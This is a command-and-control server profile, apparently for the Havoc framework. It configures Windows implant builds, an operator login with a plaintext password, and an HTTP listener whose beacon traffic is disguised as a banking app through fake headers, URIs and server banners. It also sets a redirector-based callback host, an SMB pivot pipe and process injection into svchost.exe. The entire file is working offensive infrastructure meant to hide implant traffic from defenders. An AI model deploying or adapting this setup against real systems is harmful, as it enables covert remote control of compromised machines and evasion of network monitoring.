Teamserver {
    Host = "0.0.0.0"
    Port = 40056

    Build {
        Compiler64 = "data/x86_64-w64-mingw32-cross/bin/x86_64-w64-mingw32-gcc"
        Compiler86 = "data/i686-w64-mingw32-cross/bin/i686-w64-mingw32-gcc"
        Nasm = "/usr/bin/nasm"
    }
}

Operators {
    user "neo" {
        Password = "Password.less"
    }
}

Listeners {
    Http {
        Name         = "banking profile - http"
        Hosts        = [
            "$(FRONTLINE_PUBLIC_IP_OR_DOMAIN)", # callback host - must be the frontline
        ]
        HostBind     = "0.0.0.0"
        HostRotation = "round-robin"
        PortBind     = 80
        PortConn     = 80
        Secure       = false
        KillDate     = "2024-12-31 23:59:59"
        UserAgent    = "TestRedirection" # specific user agent - must be set on the redirector's nginx configuration

        Uris = [
            "/secureapp.php",
            "/onlinebanking/",
        ]

        Headers = [
            "Accept: application/json",
            "Referer: https://securebanking.com",
            "x-ms-session-id: bank-session-id",
            "x-ms-client-type: banking-app",
            "x-mx-client-version: 3.0.0.20230101",
            "Accept-Encoding: gzip, deflate, br",
            "Origin: https://securebanking.com"
        ]

        Response {
            Headers = [
                "Content-Type: application/json; charset=utf-8",
                "Server: Apache/2.4.41",
                "X-Content-Type-Options: nosniff",
                "x-ms-environment: Banking-Production",
                "x-ms-latency: 54321.9876",
                "Access-Control-Allow-Origin: https://securebanking.com",
                "Access-Control-Allow-Credentials: true",
                "Connection: keep-alive"
            ]
        }

    }

    Smb {
        Name     = "Pivot - Smb"
        PipeName = "bank_pipe"
    }
}

Demon {
    Sleep = 2
    Jitter = 20
    
    TrustXForwardedFor = true

    Injection {
        Spawn64 = "C:\\Windows\\System32\\svchost.exe"
        Spawn32 = "C:\\Windows\\SysWOW64\\svchost.exe"
    }
}